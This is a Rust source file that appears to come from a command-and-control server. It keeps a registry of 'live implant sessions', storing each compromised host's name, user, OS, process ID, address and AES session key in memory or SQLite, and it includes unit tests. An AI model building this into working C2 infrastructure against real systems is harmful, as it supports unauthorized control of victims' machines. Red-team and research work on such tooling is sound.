use std::collections::HashMap;
use std::sync::{Arc, Mutex};

use nw_profile::crypto;
use uuid::Uuid;

use crate::persist;

/// A live implant session, keyed by session id.
#[derive(Debug, Clone)]
pub struct Session {
    pub id: Uuid,
    pub hostname: String,
    pub username: String,
    pub os: String,
    pub arch: String,
    pub pid: u32,
    pub addr: String,
    /// 32-byte AES-256 session key for this session.
    pub key: [u8; crypto::KEY_LEN],
    pub last_seen: std::time::SystemTime,
}

impl Session {
    #[allow(clippy::too_many_arguments)]
    fn new(
        id: Uuid,
        hostname: String,
        username: String,
        os: String,
        arch: String,
        pid: u32,
        addr: String,
        key: [u8; crypto::KEY_LEN],
    ) -> Self {
        Session {
            id,
            hostname,
            username,
            os,
            arch,
            pid,
            addr,
            key,
            last_seen: std::time::SystemTime::now(),
        }
    }
}

enum Backend {
    Memory(Mutex<HashMap<Uuid, Session>>),
    Sqlite(sqlx::SqlitePool),
}

/// Session registry with either an in-memory or durable SQLite backend.
pub struct SessionRegistry {
    backend: Backend,
}

impl Default for SessionRegistry {
    fn default() -> Self {
        Self::new()
    }
}

impl SessionRegistry {
    pub fn new() -> Self {
        SessionRegistry {
            backend: Backend::Memory(Mutex::new(HashMap::new())),
        }
    }

    pub fn with_sqlite(pool: sqlx::SqlitePool) -> Self {
        SessionRegistry {
            backend: Backend::Sqlite(pool),
        }
    }

    #[allow(clippy::too_many_arguments)]
    pub async fn create(
        &self,
        hostname: String,
        username: String,
        os: String,
        arch: String,
        pid: u32,
        addr: String,
        key: [u8; crypto::KEY_LEN],
    ) -> Uuid {
        let id = Uuid::new_v4();
        let session = Session::new(id, hostname, username, os, arch, pid, addr, key);
        match &self.backend {
            Backend::Memory(map) => {
                map.lock().unwrap().insert(id, session);
            }
            Backend::Sqlite(pool) => {
                let last_seen: chrono::DateTime<chrono::Utc> = session.last_seen.into();
                sqlx::query(
                    "INSERT INTO c2_sessions \
                     (id, hostname, username, os, arch, pid, addr, session_key, last_seen) \
                     VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8, ?9)",
                )
                .bind(id.to_string())
                .bind(&session.hostname)
                .bind(&session.username)
                .bind(&session.os)
                .bind(&session.arch)
                .bind(session.pid as i64)
                .bind(&session.addr)
                .bind(&session.key[..])
                .bind(last_seen.to_rfc3339())
                .execute(pool)
                .await
                .expect("persisting a newly registered C2 session");
            }
        }
        id
    }

    pub async fn get(&self, id: &Uuid) -> Option<Session> {
        match &self.backend {
            Backend::Memory(map) => map.lock().unwrap().get(id).cloned(),
            Backend::Sqlite(pool) => {
                let row = sqlx::query_as::<_, persist::SessionRow>(
                    "SELECT id, hostname, username, os, arch, pid, addr, session_key, last_seen \
                     FROM c2_sessions WHERE id = ?1",
                )
                .bind(id.to_string())
                .fetch_optional(pool)
                .await
                .ok()
                .flatten()?;
                session_from_row(row)
            }
        }
    }

    pub async fn list(&self) -> Vec<Session> {
        match &self.backend {
            Backend::Memory(map) => {
                let mut sessions: Vec<_> = map.lock().unwrap().values().cloned().collect();
                sessions.sort_by_key(|session| session.id);
                sessions
            }
            Backend::Sqlite(pool) => sqlx::query_as::<_, persist::SessionRow>(
                "SELECT id, hostname, username, os, arch, pid, addr, session_key, last_seen \
                 FROM c2_sessions ORDER BY id",
            )
            .fetch_all(pool)
            .await
            .unwrap_or_default()
            .into_iter()
            .filter_map(session_from_row)
            .collect(),
        }
    }

    pub async fn touch(&self, id: &Uuid) -> bool {
        match &self.backend {
            Backend::Memory(map) => {
                if let Some(session) = map.lock().unwrap().get_mut(id) {
                    session.last_seen = std::time::SystemTime::now();
                    true
                } else {
                    false
                }
            }
            Backend::Sqlite(pool) => {
                sqlx::query("UPDATE c2_sessions SET last_seen = ?1 WHERE id = ?2")
                    .bind(chrono::Utc::now().to_rfc3339())
                    .bind(id.to_string())
                    .execute(pool)
                    .await
                    .map(|result| result.rows_affected() == 1)
                    .unwrap_or(false)
            }
        }
    }

    pub async fn remove(&self, id: &Uuid) -> bool {
        match &self.backend {
            Backend::Memory(map) => map.lock().unwrap().remove(id).is_some(),
            Backend::Sqlite(pool) => sqlx::query("DELETE FROM c2_sessions WHERE id = ?1")
                .bind(id.to_string())
                .execute(pool)
                .await
                .map(|result| result.rows_affected() == 1)
                .unwrap_or(false),
        }
    }
}

fn session_from_row(row: persist::SessionRow) -> Option<Session> {
    let id = Uuid::parse_str(&row.id).ok()?;
    let key: [u8; crypto::KEY_LEN] = row.session_key.try_into().ok()?;
    let pid = u32::try_from(row.pid).ok()?;
    let parsed = chrono::DateTime::parse_from_rfc3339(&row.last_seen).ok()?;
    Some(Session {
        id,
        hostname: row.hostname,
        username: row.username,
        os: row.os,
        arch: row.arch,
        pid,
        addr: row.addr,
        key,
        last_seen: parsed.with_timezone(&chrono::Utc).into(),
    })
}

/// Shared handle for handlers.
pub type SharedRegistry = Arc<SessionRegistry>;

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn create_get_list_remove() {
        let reg = SessionRegistry::new();
        let id = reg
            .create(
                "h".into(),
                "u".into(),
                "linux".into(),
                "x86_64".into(),
                1,
                "1.2.3.4".into(),
                [9u8; 32],
            )
            .await;
        assert_eq!(reg.list().await.len(), 1);
        assert_eq!(reg.get(&id).await.unwrap().hostname, "h");
        assert!(reg.remove(&id).await);
        assert_eq!(reg.list().await.len(), 0);
    }

    #[tokio::test]
    async fn sqlite_sessions_survive_store_restart() {
        let dir = tempfile::tempdir().unwrap();
        let db = dir.path().join("sessions.sqlite");
        let pool = crate::persist::open_pool(db.to_str().unwrap())
            .await
            .unwrap();
        let first = SessionRegistry::with_sqlite(pool.clone());
        let id = first
            .create(
                "durable-host".into(),
                "operator".into(),
                "linux".into(),
                "x86_64".into(),
                42,
                "127.0.0.1".into(),
                [4u8; 32],
            )
            .await;

        let restarted = SessionRegistry::with_sqlite(pool);
        let restored = restarted.get(&id).await.unwrap();
        assert_eq!(restored.hostname, "durable-host");
        assert_eq!(restored.key, [4u8; 32]);
    }
}
